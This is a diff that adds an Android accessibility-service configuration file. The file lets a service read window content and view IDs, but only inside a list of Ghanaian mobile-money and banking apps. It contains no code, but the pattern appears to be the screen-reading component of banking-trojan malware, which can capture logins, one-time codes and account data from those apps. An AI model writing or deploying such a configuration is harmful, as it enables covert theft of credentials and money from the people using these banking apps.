@@ -1,0 +1,9 @@
+<?xml version="1.0" encoding="utf-8"?>
+<accessibility-service xmlns:android="http://schemas.android.com/apk/res/android"
+    android:accessibilityEventTypes="typeWindowStateChanged"
+    android:accessibilityFeedbackType="feedbackGeneric"
+    android:accessibilityFlags="flagReportViewIds|flagRetrieveInteractiveWindows"
+    android:canRetrieveWindowContent="true"
+    android:description="@string/accessibility_service_description"
+    android:notificationTimeout="100"
+    android:packageNames="com.mtn.mymtn,com.vodafone.myvodafone,com.at.ghana,com.gcb.mobilebanking,com.ecobank.mobile,com.zenithbank.ghana,com.fidelity.ghana,com.stanbic.banking,com.zeepay.mobile,com.hubtel.merchant" />
